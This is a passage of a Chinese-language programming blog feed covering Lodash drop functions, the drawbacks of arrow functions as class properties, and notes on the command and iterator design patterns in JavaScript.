o.active&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropRightWhile(users,&#123;'user':'pebbles','active':false&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;]_.dropRightWhile(users,['active',false]) //[&#123; 'user': 'barney', 'active': true &#125;]_.dropRightWhile(users,'haha') //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;] _.dropWhile创建一个数组切片，从开头丢弃掉一些元素。被丢弃的元素是从开头开始循环的，直到 predicate 返回 falsey.predicate 函数有三个参数：value,index,array 语法： _.dropWhile(array,[predicate=_.identity]) 参数： array(Array): 目标数组 [predicate=_.identity](Function):每次迭代要调用的函数 返回： (Array):返回数组的切片 123456789101112131415var users = [ &#123; 'user': 'barney', 'active': true &#125;, &#123; 'user': 'fred', 'active': false &#125;, &#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;,];_.dropWhile(users,function(o)&#123;return !o.active&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,function(o)&#123;return o.active&#125;) //[&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,&#123;'user':'barney','active':false&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,['active',true]) //[&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,'user') //[] 参考链接Lodash]]></content>
      <categories>
        <category>JavaScript工具库</category>
      </categories>
      <tags>
        <tag>Lodash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[类属性中的箭头函数可能不如我们想象的那么伟大]]></title>
    <url>%2F2019-02-28-%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E5%8F%AF%E8%83%BD%E4%B8%8D%E5%A6%82%E6%88%91%E4%BB%AC%E6%83%B3%E8%B1%A1%E4%B8%AD%E9%82%A3%E4%B9%88%E4%BC%9F%E5%A4%A7%EF%BC%88%E8%BD%AC%EF%BC%89.html</url>
    <content type="text"><![CDATA[原文地址：Arrow Functions in Class Properties Might Not Be As Great As We Think 类属性中的箭头函数可能不如我们想象的那么伟大Class Properties Proposal简化了我们的生活，特别是在内部的React中state ，甚至是propTypes和defaultProps 。 无类属性： 12345678910111213141516171819202122class Greeting extends Component &#123; constructor(props)&#123; super(props); this.state = &#123; isLoading:false, &#125; &#125; render()&#123; return( &lt;div&gt;Hello,&#123;this.props.name&#125;&lt;/div&gt; ) &#125;&#125;Greeting.propTypes = &#123; name: PropTypes.String.isRequired,&#125;;Greeting.defaultProps = &#123; name:'Stranger',&#125; 有类属性： 12345678910111213141516171819class Greeting extends Component &#123; static propTypes = &#123; name:PropTypes.String.isRequire, &#125;; static defaultProps =&#123; name: 'Stranger' &#125;; state = &#123; isLoading:false, &#125; render()&#123; return( &lt;div&gt;Hello,&#123;this.props.name&#125;&lt;/div&gt; ) &#125;&#125; 此外，类属性/属性初始化器在过去（2017年11月16日）六个月中似乎更趋向于处理 React 中的绑定而不是构造函数中的绑定调用。 类属性中箭头函数的用法： 123456789class ComponentA extends Component&#123; handleClick = () =&gt;&#123; // ... &#125; render()&#123; // ... &#125;&#125; 类字段属性中的箭头函数看起来似乎非常有用，因为它们会自动绑定，不需要加 this.handleClick = this.handleClick.bind(this) 在构造器中。 那么，我们应该在类属性中运用箭头函数吗？首先，让我们看看类属性的作用。 为什么类属性看起来像曾经转化为 ES2017让我们编写一个简单的类，其中包含一个静态属性、一个实例属性、一个属性中的箭头函数，以及一个通常作为插件方法的函数transform-class-properties 12345678910111213class A &#123; static color = 'red'; counter = 0; handleClick = () =&gt;&#123; this.counter++; &#125; handleLongClick()&#123; this.counter++; &#125; &#125; 一旦我们进入 Babel REPL 用下面的预设将上面的类转换为ES2017的：es2017和stage-2。 我们就可以得到下面的转换版本： 1234567891011121314class A &#123; constructor()&#123; this.counter = 0; this.handleClick = () =&gt;&#123; this.counter++; &#125; &#125; handleLongClick()&#123; this.counter++; &#125;&#125;A.color = 'red' 如我们所见，实例属性已经被移到了构造函数里面，而静态属性则被移到了类后面的声明。 就作者个人而言，他很喜欢加 static 关键字，因为我们可以直接 export 使用静态属性。 在实例属性上，它的优点是不用在构造函数中编译导致其过于臃肿。 对于属性中的箭头函数， handleClick 也同样被移动到了构造函数，就像实例属性一样。 对于我们通常定义的 handleLongClick 方法则没有任何改变。 属性初始化器可能对属性很有用，但是对于类属性中的箭头函数，它就像是实现绑定的一种设计不良的解决方法。 Mockability如果你想去模仿或者是监视一个类的方法，最简单而且最恰当的方式是使用原型。因为所有对象都可以通过原型链看到对对象原型对象的所有更改。 对上面例子中的 class A 进行一些测试： 12345678910111213class A &#123; static color = 'red'; counter = 0; handleClick = () =&gt;&#123; this.counter++; &#125; handleLongClick()&#123; this.counter++; &#125; &#125; A.prototype.handleLongClick 被定义了 A.prototype.handleClick 不是一个方法 因为我们在类属性中使用了箭头函数，所以我们的函数 handleClick只在构造函数初始化时定义，而不是在原型中定义。因此我们在实例化对象中模拟我们的函数，其他对象也不会通过原型链看到这些更改。 Inheritance定义基本类 A 1234567891011121314151617class A &#123; handleClick = () =&gt;&#123; this.counter++; &#125; handleLongClick()&#123; this.counter++; &#125; &#125;console.log(A.prototype);// &#123;constructor: ƒ, handleLongClick: ƒ&#125;new A().handleClick();// A.handleClicknew A().handleLongClick();// A.handleLongClick 如果类B 继承 A，handleClick 不会在原型中而且我们也无法通过 super.handleClick 调用我们的箭头函数 handleClick 1234567891011121314151617181920212223class B extends A&#123; handleClick = () =&gt;&#123; super.handleClick(); console.log('B.handleClick'); &#125; handleLongClick()&#123; super.handleLongClick(); console.log('B.handleLongClick'); &#125; &#125;console.log(B.prototype);// &#123;constructor: ƒ, handleLongClick: ƒ&#125;console.log(B.prototype.__proto__);// &#123;constructor: ƒ, handleLongClick: ƒ&#125;new B().handleClick();// Uncaught TypeError: (intermediate value).handleClick is not a functionnew B().handleLongClick();// A.handleLongClick// B.handleLongClick 如果类C 去继承类 A,但是 handleClick 实现为一个普通函数而不是箭头函数，然后handleClick 只执行super.handleClick()而不做其他的，这样不是很奇怪吗？ 这是因为 handleClick 在父类的构造函数中的实例化会覆盖它。 C.prototype.handleClick() 会调用我们的实现但是会因为上一个错误而失败：Uncaught TypeError: (intermediate value).handleClick is not a function 1234567891011121314class C extends A &#123; handleClick()&#123; super.handleClick(); console.log('C.handleClick'); &#125;&#125;console.log(C.prototype);// &#123;constructor: ƒ, handleLongClick: ƒ&#125;console.log(C.prototype.__proto__);// &#123;constructor: ƒ, handleLongClick: ƒ&#125;new C().handleClick();// C.handleClick 如果类D 是一个继承类A的普通空白类，它就会有一个空的原型，然后 new D().handleClick 就会输出 A.handleClick 1234567891011class D extends A &#123;&#125;console.log(D.prototype);// &#123;constructor: ƒ&#125;console.log(C.prototype.__proto__);// &#123;constructor: ƒ, handleLongClick: ƒ&#125;new D().handleClick();// A.handleClick Performance现在是有趣的部分，让我们看看性能。 我们知道通常的函数在原型中定义，然后在所有的实例之间共享。如果我们有N个组件的列表，这些组件将会共享相同的方法。所以，如果我们的组件被点击，我们会调用方法N次，调用相同的原型。由于我们在原型中会多次调用相同的方法，JavaScript 引擎对其作出了优化。 另一方面，对于类属性的箭头函数，如果我们创建 N 个组件，这些组件也会创建 N 个函数。记得我们在转换版本中看到的内容，类属性在构造函数中初始化，这意味着我们点击 N 个组件会调用 N 个不同的方法。 让我们看看在 V8 引擎（Chrome）的基准测试是如何做的。 第一个很简单，我们只要测试实例化的时间，然后我们调用一次我们的方法。 注意，这个数字在这里并不重要，因为在应用程序中不会注意到实例化，我们要讨论的是每秒的操作，这个数字已经足够高了。我更关心函数之间的差距。 第二个，使用了一个代表性的用例，100个组件的实例化，就像一个列表，我们每次调用一个方法之后。 所有基准测试均在Mac OS Pro 13“2016 2GHz Mac OS X 10.13.1和Chrome 62.0.3202上运行。 简而言之，为了提高性能，应该在原型中去声明共享方法，并且只在需要的时候将其绑定到上下文（如果作为 prop 或者 callback 传递）。将我们的共享方法绑定到原型并在实例的构造函数中初始化我们的属性是有意义的，但方法并不多。 关于 high ops/s，我们可以清楚地看到类属性中的箭头函数并不像我们想象中那么高效。 结论 类属性中箭头函数会被转换为构造函数 类属性中的箭头函数不会在原型中，我们也无法通过 super 调用它们。 类属性中的兼有函数比绑定函数慢得多，并且两者都慢于普通的函数 如果你打算传递它，应该只用 .bind() 或者箭头函数绑定一个方法。]]></content>
      <categories>
        <category>转载好文</category>
      </categories>
      <tags>
        <tag>Arrow_Function</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——命令模式]]></title>
    <url>%2F2019-02-25-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——命令模式假设有一个快餐店，而我是快餐店的点餐服务员，那么我的一天的工作应该是这样的：当某位客人点餐或者打来订餐电话，我会把他的需求写在清单上，然后交给厨房，客人不用关心是哪些厨师帮他炒菜。我们餐厅还可以满足客人需要的定时服务，比如客人可能目前正在回家的路上，要求 1 个小时候才可以炒菜，只要订单在，厨师就不会忘记。客人也可以很方便地打电话来撤销订单。另外如果有太多的客人点餐，厨房可以按照订单的顺序来排队炒菜。 这些记录着订餐信息的清单就是命令模式中的命令对象。 命令模式的用途命令模式是最简单和优雅的设计模式之一，命令模式中的命令（command）指的是一个执行某些特定事情的指令。 命令模式最常见的应用场景是：有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么。此时希望用一种松耦合的方式来设计程序，使得请求发送者和请求接收者能够消除彼此之间的耦合关系。 拿订餐来说，客人需要向厨师发送请求，但是完全不知道这些厨师的名字和联系方式，也不知道厨师炒菜的方式和步骤。命令模式把客人订餐的请求封装成 command 对象，也就是订单中的订单对象。这个对象可以在程序中被四处传递，就像订单可以从服务员手中传到厨师的手中。这样一来，客人不需要知道厨师的名字，从而解开了请求调用者和请求接收者之间的耦合关系。 另外，相对于过程化的请求调用， command 对象拥有更长的生命周期。对象的生命周期是跟初始请求无关的，因为这个请求已经被封装在了 command 对象的方法中，成为了这个对象的行为。我们可以在程序运行的任意时刻去调用这个方法，就像厨师可以在客人预订1个小时之后才帮他炒菜，相当于程序在1小时之后才开始执行 command 对象的方法。 除了这两点之外，命令模式还支持撤销、排队等操作。 命令模式的例子——菜单程序假设我们正在编写一个用户界面程序，该界面至少有数十个 Button 按钮。因为项目比较复杂，所以我们决定让某个程序员负责绘制这些按钮，而另外一个程序员则负责编写点击按钮后的具体行为，这些行为都封装在 了对象里面。 在大型项目开发中，这是很正常的分工，对于绘制按钮的程序员来说，他完全不知道某个按钮未来将用来做什么，可能用来刷新菜单界面，也可能来增加一些子菜单，他只知道点击这个按钮会发生某些事情。那么当完成这个按钮的绘制之后，应该如何给它绑定 onclick事件呢？ 有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么，此时希望用一种松耦合的方式来设计软件，使得请求发送者和请求接收者能够消除彼此之间的耦合关系 我们很快就可以找到这里运用命令模式的理由：点击了按钮之后，必须向某些负责具体行为的对象发送请求，这些对象就是请求的接收者。但是目前并不不知道接收者是什么对象，不知道接收者究竟会做什么。此时我们需要借助命令对象的帮助，以便解开按钮和负责具体行为对象之间的耦合。 设计模式的主题总是把不变的事物和变化的事物分离开来，命令模式也不例外。按下按钮之后会发生一些事情是不变的，而具体会发生什么是可变的。通过 command 对象的帮助，将来我们可以轻易地改变这种关联，因此也可以在将来再次改变按钮的行为。 下面是代码的编写阶段，首先在页面中完成这些按钮的 “绘制”： 12345678910&lt;body&gt; &lt;button id="button1"&gt;点击按钮1&lt;/button&gt; &lt;button id="button2"&gt;点击按钮2&lt;/button&gt; &lt;button id="button3"&gt;点击按钮3&lt;/button&gt; &lt;script&gt; var button1 = document.getElementById( 'button1' ); var button2 = document.getElementById( 'button2' ); var button3 = document.getElementById( 'button3' ); &lt;/script&gt;&lt;/body&gt; 定义 setCommand 函数，这个函数负责向上面的按钮安装命令，可以肯定的是，点击按钮会执行某个 command 命令，执行命令的动作被约定为调用 command 对象的 execute() 方法。虽然不知道命令究竟代表着什么操作，但负责绘制按钮的程序员并不关心这些事情，他只需要预留好安装命令的接口， command 对象自然知道如何和正确的对象沟通： 12345var setCommand = function(button,command)&#123; button.onclick = function()&#123; command.execute(); &#125;&#125; 最后，负责编写点击按钮之后的具体行为的程序员交上了成果，完成了刷新菜单界面、增加子菜单和删除子菜单这几个功能，这几个功能被分布在 MenuBar 和 SubMenu 这两个对象中： 1234567891011121314var MenuBar = &#123; refresh:function()&#123; console.log('刷新菜单目录'); &#125;&#125;var SubMenu = &#123; add:function()&#123; console.log('增加子菜单'); &#125;, del:function()&#123; console.log('删除子菜单'); &#125;&#125; 为让 button 变得有用起来，我们要先把之前这些行为都封装在命令类中： 12345678910111213141516171819202122232425262728293031323334var MenuBar = &#123; refresh:function()&#123; console.log('刷新菜单目录'); &#125;&#125;var SubMenu = &#123; add:function()&#123; console.log('增加子菜单'); &#125;, del:function()&#123; console.log('删除子菜单'); &#125;&#125;var RefreshMenuBarCommand = function(receiver)&#123; this.receiver = receiver;&#125;RefreshMenuBarCommand.prototype.execute = function()&#123; this.receiver.refresh();&#125;var AddSubMenuCommand = function(receiver)&#123; this.receiver = receiver;&#125;AddSubMenuCommand.prototype.execute = function()&#123; this.receiver.add();&#125; var DelSubMenuCommand = function(receiver)&#123; this.receiver = receiver;&#125;DelSubMenuCommand.prototype.execute = function()&#123; this.receiver.del();&#125; 最后就是把命令接受者传入到 command 对象中，并且把 command 对象安装到 button 上面： 1234567var refreshMenuBarCommand = new RefreshMenuBarCommand(MenuBar);var addSubMenuCommand = new AddSubMenuCommand(SubMenu);var delSubMenuCommand = new DelSubMenuCommand(SubMenu);setCommand(button1,refreshMenuBarCommand);setCommand(button2,addSubMenuCommand);setCommand(button3,delSubMenuCommand); 以上只是一个很简单的命名模式示例，但从中我们可以看到我们是如何把请求发送者和请求接收者解耦开的。 JavaScript 中的命令模式可能我们会觉得很奇怪，所谓的命令模式就是给对象的的某个方法取了 execute 的名字，引入 command 对象和 receiver 这两个无中生有的角色无非是把简单的事情复杂化了，即使不引用什么模式，下面几行代码就可以实现相同的功能： 1234567891011121314151617181920var bindClick = function(button,func)&#123; button.onclick = func;&#125;var MenuBar = &#123; refresh:function()&#123; console.log('刷新菜单目录'); &#125;&#125;var SubMenu = &#123; add:function()&#123; console.log('增加子菜单'); &#125;, del:function()&#123; console.log('删除子菜单'); &#125;&#125;bindClick(button1,MenuBar.refresh);bindClick(button2,SubMenu.add);bindClick(button2,SubMenu.del); 这种说话是正确的，上面代码是模拟传统面向对象语言的命令模式实现。命令模式将过程式的请求调用封装在 command对象 execute 方法里，通过封装方法调用，我们可以把运算块包装成形。command 对象可以被四处传递，所以在调用命令的时候，客户不需要关心事情是如何进行的。 命令模式的由来，其实是回调函数的一个面向对象的替代品。 JavaScript 作为将函数作为一等对象的语言，跟策略模式一样，命令模式也早已融入到了 JavaScript 语言之中。运算块不一定要封装在 command.execute 方法中，也可以封装在普通函数中。函数作为一等对象，本身就可以四处传递。即使我们依然需要请求“接收者”，也未必使用面向对象的方式，闭包可以完成同样的功能。 在面向对象设计中，命令模式的接收者被当成 command 对象的属性保存起来。同时约定执行命令的操作调用 command.execute 方法。在使用闭包的命令模式的实现中，接收者被封闭在闭包产生的环境中，执行命令的操作可以更加简单，仅仅执行回调函数即可。无论接收者被保存为对象的属性，还是被封闭在闭包的环境中，在将来执行命令的时候，接收者都可以被顺序访问，用闭包实现的命令模式如下代码所示： 123456789101112131415161718192021var setCommand = function(button,func)&#123; button.onclick = function()&#123; fnuc(); &#125;&#125;var MenuBar = &#123; refresh:function()&#123; console.log('刷新菜单目录'); &#125;&#125;var RefreshMenuBarCommand = function(receiver)&#123; return function()&#123; receiver.refresh(): &#125;&#125;var refreshMenuBarCommand = RefreshMenuBarCommand(MenuBar);setCommand(button1,refreshMenuBarCommand); 当然，如果想更明确地表达当前正在使用命令模式，或者除了执行命令之外，将来还有可能要提供撤销命令等操作。所以最好还是把执行函数改为调用 execute 方法： 1234567891011121314var RefreshMenuBarCommand = function(receiver)&#123; return &#123; execute:function()&#123; receiver.refresh(): &#125; &#125;&#125;var setCommand = function(button,command)&#123; button.onclick = function()&#123; command.execute(); &#125;&#125;var refreshMenuBarCommand = RefreshMenuBarCommand(MenuBar);setCommand(button1,refreshMenuBarCommand); 撤销命令命令模式的作用不仅是封装运算块，而且可以很方便地给命令对象增加撤销操作。就像是订餐时客人可以通过电话来取消订单一样。下面看看撤销命令的例子。 用策略模式中的小球运动 Animate 类编写一个动画，这个动画的表现是让页面上的小球移动到水平方法的位置。现在页面中有一个 input 文本框和 button 按钮，文本框中可以输入一些数字，表示小球移动后的水平位置，小球在用户点击按钮后立刻开始移动： 123456789101112131415&lt;body&gt; &lt;div id="ball" style="position:absolute;background:#000;width:50px;height:50px"&gt;&lt;/div&gt; 输入小球移动后的位置：&lt;input id="pos"/&gt; &lt;button id="moveBtn"&gt;开始移动&lt;/button&gt; &lt;/body&gt;&lt;script&gt;var ball = document.getElementById('ball');var pos = document.getElementById('pos');var moveBtn = document.getElementById('moveBtn');moveBtn.onclick = function()&#123; var animate = new Animate(ball); animate.start('left',pos.value,1000,'strongEaseOut');&#125;&lt;/script&gt; 接着再实现一个撤销功能，页面上有一个撤销按钮，点击按钮之后，小球便可以回到上一次的位置。 在给页面增加撤销按钮之后，先把之前的代码改为用命令模式实现： 1234567891011121314151617var ball = document.getElementById('ball');var pos = document.getElementById('pos');var moveBtn = document.getElementById('moveBtn');var MoveCommand = function(receiver,pos)&#123; this.receiver = receiver; this.pos = pos;&#125;MoveCommand.prototype.execute = function()&#123; this.receiver.start('left',this.pos,1000,'strongEaseOut');&#125;var moveCommand;moveBtn.onclick = function()&#123; var animate = new Animate(ball); moveCommand = new MoveCommand(animate,pos.value); moveCommand.execute(); &#125; 接下来增加撤销按钮： 123456789101112131415161718192021222324252627282930313233343536&lt;body&gt; &lt;div id="ball" style="position:absolute;background:#000;width:50px;height:50px"&gt;&lt;/div&gt; 输入小球移动后的位置：&lt;input id="pos"/&gt; &lt;button id="moveBtn"&gt;开始移动&lt;/button&gt; &lt;button id="cancelBtn"&gt;cancel&lt;/cancel&gt; &lt;!--增加取消按钮--&gt; &lt;/body&gt;&lt;script&gt;var ball = document.getElementById('ball');var pos = document.getElementById('pos');var moveBtn = document.getElementById('moveBtn');var cancelBtn = document.getElementById('cancelBtn');var MoveCommand = function(receiver,pos)&#123; this.receiver = receiver; this.pos = pos; this.oldPos = null;&#125;MoveCommand.prototype.execute = function()&#123; this.receiver.start('left',this.pos,1000,'strongEaseOut'); this.oldPos = this.receiver.dom.getBoundingClientRect()[ this.receiver.propertyName ]; &#125; MoveCommand.prototype.undo = function()&#123; console.log(this.oldPos); console.log(this.receiver); this.receiver.start('left',this.oldPos,1000,'strongEaseOut');&#125;var moveCommand;moveBtn.onclick = function()&#123; var animate = new Animate(ball); moveCommand = new MoveCommand(animate,pos.value); moveCommand.execute(); &#125;cancelBtn.onclick = function()&#123; moveCommand.undo();&#125;&lt;/script&gt; 现在通过命令模式可以轻松实现了撤销功能，如果用普通的方法调用来实现，也许需要每次都手工几率小球的运动轨迹，才能让它还原到之前的位置。而命令模式中小球的原始位置在小球开始移动前已经作为 command 对象的属性保存起来了，所以只需要再提供一个 undo 方法，并且在 undo 方法中让小球回到刚刚记录的原始位置就可以了。 撤销是一个非常有用的功能，撤销命令还可以用于实现文本编辑器的 ctrl+z 功能。 撤销和重做很多时候，我们需要一系列的命令，比如在一个围棋程序中，现在已经下了 10 步棋了，我们需要一次性悔棋到第 5 步，在这之前，我们可以把所有执行过的下棋命令都存储在一个历史列表中，然后倒序循环来执行这些命令的 undo 操作，直到循环执行到第五个命令为止。 但是也有例外的，在 canvas 画图程序中，画布上有一些点，我们在这些点之间画了 N 条曲线把这些点互相连接起来，当然是用命令模式来实现的。但是却很难为这里的命令对象定义一个擦除某条曲线的undo 操作，因为在 Canvas 画图中，擦除一条线相对不容易实现。 这时候最好的办法是先擦除画布，然后把刚刚执行过一遍的命令重新执行一遍，这一点同样可以利用一个历史列表堆栈来实现。记录命令日志，然后重复执行它们，这是逆转不可逆命令的一个好方法。 命令模式可以用来实现播放录像功能，原理跟 Canvas 画图的例子一样，我们把用户在键盘的输入都封装成命令，执行过的命令将被存放到堆栈中。播放录像的时候只需要从头开始依次执行这些命令就可以了，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142var Ryu = &#123; attack:function()&#123; console.log('攻击'); &#125;, defense:function()&#123; console.log('防御'); &#125;, jump:function()&#123; console.log('跳跃'); &#125;, crouch:function()&#123; console.log('蹲下'); &#125;&#125;var makeCommand = function(receiver,state)&#123; // 创建命令 return function()&#123; receiver[state](); &#125;&#125;var commands = &#123; "119":"jump", // W "115":"crouch", // S "97":"defense", // A "100":"attack" // D&#125;var commandStack = []; // 保存命令的堆栈document.onkeypress = function(ev)&#123; var keyCode = ev.keyCode, command = makeCommand(Ryu,commands[keyCode]); if(command)&#123; command(); // 执行命令 commandStack.push(command); // 将刚刚执行过的命令保存进堆栈 &#125;&#125;document.getElementById('replay').onclick = function()&#123; var command; while(command = commandStack.shift())&#123; // 从堆栈中取出命令并依次执行 command(); &#125;&#125;; 可以看到，当我们在键盘上敲下 W、A、S、D 这几个键来完成一些动作之后，再按下 Replay按钮，此时便会重复播放之前的动作。 命令队列在订餐的故事中，如果订餐的数量过多而厨师的人手不够用，则可以让这些订单排队进行处理。第一个订单完成之后，再开始执行跟第二个订单有关的操作。 队列在动画中的运用场景也非常多，比如之前的小球运动程序有可能遇到另外的一个问题： 有些用户反馈，这个程序只适合 APM 小于20 的人群，大部分用户都有快速点击按钮的习惯，当用户第二次点击 button 的时候，此时小球的前一个动画尚未结束，于是前一个动画会骤然停止，小球转而开始第二个动画的运动过程。但这并不是用户的期望，用户希望这两个动画会排队进行。 把请求封装成命令对象的优点在这里体现出来了，对象的生命周期几乎是永久的，除非我们主动去回它。也就是说，命令对象的声明周期跟初始请求发生的时间没有关系，command 对象的 execute 方法可以在程序运行的任何时刻执行，即使点击按钮的请求早已发生，但我们的命令对象仍然是有生命的。 所以我们可以把 div 的这些运动过程都封装成为命令对象，再把它们压进一个队列堆栈，当动画执行完，也就是当前的 command 对象的职责完成之后，会主动通知队列，此时取出正在队列中等的第一个命令对象，并且执行它。 我们比较关注的问题是，一个动画结束后该如何通知队列，通常可以使用回调函数来通知队列，除了回调函数，还可以选发布-订阅模式。即在一个动画结束后发布一个消息，订阅者接收到这个消息后，便开始执行队列里的下一个动画。 宏命令宏命令是一组命令的集合，通过执行宏命令的方式，可以一次执行一批命令。例如，家里有一个遥控器，每天回家的时候，只要一个特别的按钮，它就会帮我们关上房间门，顺便打开电脑并登陆 QQ。 1234567891011121314151617181920212223242526272829303132333435var closeDoorCommand = &#123; execute:function()&#123; console.log('关门'); &#125;&#125;var openPcCommand = &#123; execute:function()&#123; console.log('开电脑'); &#125;&#125;var openQQCommand = &#123; execute:function()&#123; console.log('登录QQ'); &#125;&#125;var MacroCommand = function()&#123; return&#123; commandList:[], add:function(command)&#123; this.commandList.push(command); &#125;, execute:function()&#123; for(var i=0,command;command = this.commandList[i++];)&#123; command.execute(); &#125; &#125; &#125;&#125;var macroCommand = new MacroCommand();macroCommand.add(closeDoorCommand);macroCommand.add(openPcCommand);macroCommand.add(openQQCommand);macroCommand.execute(); 当然我们还可以为宏命令添加撤销的功能，跟 macroCommand.execute 类似，当调用 macroCommand.undo 方法的时候，宏命令里包含的所有子命令对象要依次执行各自的 undo 操作。 宏命令是命令模式与组合模式的联用产物。 智能命令与傻瓜命令12345var closeDoorCommand = &#123; execute:function()&#123; console.log('关门'); &#125;&#125; 上面的命令，可以看到 closeDoorCommand 中没有任何 receiver 的消息，它本身包揽了执行请求的行为，这跟我们之前的命令对象都包含了一个 receiver 是矛盾的。 一般来说，命令模式都会在 command 对象中保存一个接收者来负责真正执行客户的请求，这种情况下的命令对象是 “傻瓜式”的，它只负责把客户的请求转交给接收者来执行，这种模式的好处是请求者和接收者之间尽可能地解耦。 但是我们可以定义一些更聪明的命令对象，聪明的命令对象可以直接实现请求，这样一来就不再需要接收者的存在，这种聪明的命令对象也叫做智能命令。没有接收者的智能命令，退化到和策略模式非常相近，从代码结构上面已经无法分辨它们了，能分辨的只有它们的意图的不同。策略模式指向的问题领域更小，所有的策略对象的目标都是一致的，它们只是达到这个目标的不同手段，它们的内部实现是针对 “算法”而言的。而智能命令模式的问题更加广泛，command 对象解决的目标更具有发散性。命令模式还可以完成撤销，排队等功能。 小结跟许多语言不同，JavaScript 可以用高阶函数非常方便地实现命令模式，在 JavaScript 语言中，命令模式是一种隐形的模式。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——迭代器模式]]></title>
    <url>%2F2019-02-23-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——迭代器模式迭代器模式是指提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。迭代器模式可以把迭代的过程从业务逻辑中分离出来，在使用迭代器模式之后，即使不关心对象的内部构造，也可以按顺序访问其中的每个元素。 jQuery中的迭代器迭代器模式无非是循环访问聚合对象中的各个元素。比如jQuery 中的 $.each 函数，其中回调函数中的参数 i 为当前索引，n 为当前元素，代码如下： 1234$.each([1,2,3],function(i,n)&#123; console.log('当前小标为：'+i); console.log('当前值为：'+n);&#125;); 实现自己的迭代器我们来实现自己的一个 each 函数，each 函数接受2个参数，第一个参数为被循环的数组，第二个参数为循环中的每一步后被触发的回调函数。 123456789var each = function(ary,callback)&#123; for(var i=0,l=ary.length;i&lt;l;i++)&#123; callback.call(ary[i],i,ary[i]); // 把下标和元素当做参数传给 callback 函数 &#125;&#125;each([1,2,3],function(i,n)&#123; console.log(i,n);&#125;); 内部迭代器和外部迭代器迭代器可以分为内部迭代器和外部迭代器。 1.内部迭代器上面的 each 函数属于内部迭代器，each 函数的内部已经定义好了迭代规则，它完全接手了整个迭代过程，外部只需要一次初始调用。 内部迭代器在调用的时候非常方便，外界根本不需要关心迭代器内部的实现，跟迭代器的交互也仅仅是一次初始调用，但这也是内部迭代器的缺点。由于内部迭代器的迭代规则已经被提前规定，上面的 each 函数就无法同时迭代两个数组了。 比如现在有一个需求，需要判断2个数组元素的值是否完全相等，如果不改写 each 函数本身的代码，我们能够入手的就只有 each 函数的回调函数了，代码如下： 123456789101112131415161718192021222324var each = function(ary,callback)&#123; for(var i=0,l=ary.length;i&lt;l;i++)&#123; callback.call(ary[i],i,ary[i]); // 把下标和元素当做参数传给 callback 函数 &#125;&#125;each([1,2,3],function(i,n)&#123; console.log(i,n);&#125;);var compare = function(ary1,ary2)&#123; if(ary1.length !== ary2.length)&#123; throw new Error('ary1 和 ary2 不相等'); &#125; each(ary1,function(i,n)&#123; if(n !== ary2[i])&#123; throw new Error('ary1 和 ary2 不相等'); &#125; &#125;) console.log('ary1 和 ary2 相等');&#125;compare([1,2,3],[1,2,3]); 在一些没有闭包的语言中，内部迭代器本身的实现也相当复杂，比如 C 语言中的内部迭代器是用函数的指针来实现的，循环处理需要的数据都要以参数的形式明确地从外部传递进去。 2.外部迭代器外部迭代器必须显式地请求迭代下一个元素。 外部迭代器增加了一些调用的复杂度，但相对也增强了迭代器的灵活性，可以手工控制迭代器的过程或者是顺序。 123456789101112131415161718192021222324252627282930var Iterator = function(obj)&#123; var current = 0; var next = function()&#123; current += 1; &#125; var isDone = function()&#123; return current &gt;= obj.length; &#125; var getCurrItem = function()&#123; return obj[current]; &#125; return&#123; next, isDone, getCurrItem &#125;&#125;// 改写 compare 函数var compare = function(iterator1,iterator2)&#123; while(!iterator1.isDone() &amp;&amp; !iterator2.isDone())&#123; if(iterator1.getCurrItem() !== iterator2.getCurrItem())&#123; throw new Error('iterator1 和 iterator2 不相等'); &#125; iterator1.next(); iterator2.next(); &#125; console.log('iterator1 和 iterator2 相等');&#125;compare(Iterator([1,2,3]),Iterator([1,2,4])); 